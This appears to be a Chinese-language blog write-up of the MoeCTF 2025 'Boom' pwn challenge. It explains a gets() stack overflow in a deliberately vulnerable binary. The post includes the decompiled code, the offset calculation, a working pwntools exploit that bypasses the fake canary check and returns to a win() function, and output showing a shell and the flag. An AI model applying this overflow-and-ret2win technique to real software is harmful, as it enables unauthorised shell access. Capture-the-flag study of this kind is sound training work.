---
title: 'XiDianCTF MoeCTF 2025 PWN Boom'
date: '2026-09-04T11:33:13+08:00'
lastmod: '2026-09-04T11:33:13+08:00'
summary: ""
hideSummary: true
draft: false
author: "QingKong996"
categories:
  - "CTF"
tags:
  - "CTF"
  - "PWN"
---

```
本文为人工撰写，仅使用生成式AI校对。
```

[题目链接](https://ctf.xidian.edu.cn/training/22?challenge=964)

依旧是丢进IDA。

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char s[124]; // [rsp+0h] [rbp-90h] BYREF
  int v5; // [rsp+7Ch] [rbp-14h]
  int v6; // [rsp+8Ch] [rbp-4h]

  init(argc, argv, envp);
  puts("Welcome to Secret Message Book!");
  puts("Do you want to brute-force this system? (y/n)");
  fgets(&brute_choice, 8, stdin);
  v6 = 0;
  if ( brute_choice == 121 || brute_choice == 89 )
  {
    v6 = 1;
    canary = (int)random() % 114514;
    v5 = canary;
    puts("waiting...");
    sleep(1u);
    puts("boom!");
    puts("Brute-force mode enabled! Security on.");
  }
  else
  {
    puts("Normal mode. No overflow allowed.");
  }
  printf("Enter your message: ");
  if ( v6 )
    gets(s);
  else
    fgets(s, 128, stdin);
  if ( v6 && v5 != canary )
  {
    puts("Security check failed!");
    exit(1);
  }
  puts("Message received.");
  return 0;
}
```

注意到如果选择`n`只能够额外溢出4字节，显然是不够的。

所以这里只能选择`y`。

canary在v5我们无法读到，但最后的security check只要v6为0就可以通过，只要构造使v6为0，然后ret2text即可。

这里直接使用ida提供的偏移，从s向上偏移0x90+0x8=0x98即152个字节达到栈存放的返回地址。

这里为了省事，不单独计算v6的偏移，填充时全部置0即可。

```c
ext:0000000000401276 ; int win()
.text:0000000000401276                 public win
.text:0000000000401276 win             proc near
.text:0000000000401276 ; __unwind {
.text:0000000000401276                 endbr64
.text:000000000040127A                 push    rbp
.text:000000000040127B                 mov     rbp, rsp
.text:000000000040127E                 lea     rax, command    ; "/bin/sh"
.text:0000000000401285                 mov     rdi, rax        ; command
.text:0000000000401288                 call    _system
.text:000000000040128D                 nop
.text:000000000040128E                 pop     rbp
.text:000000000040128F                 retn
.text:000000000040128F ; } // starts at 401276
.text:000000000040128F win             endp
```

目标地址为`0x40127E`

pwntools脚本:

```python
from pwn import *
context(arch='amd64', os='linux', log_level='error')

io = connect("127.0.0.1", 10626)

io.sendline(b'y')


io.send(b'\x00' * 152 + p64(0x40127E))


io.interactive()
```

输出:

```
Welcome to Secret Message Book!
Do you want to brute-force this system? (y/n)
waiting...
boom!
Brute-force mode enabled! Security on.
Enter your message:
Message received.
>> ls 
bin
flag
lib
lib32
lib64
libexec
libx32
pwn
>> cat flag
moectf{THIS_IS_FLAG}
```





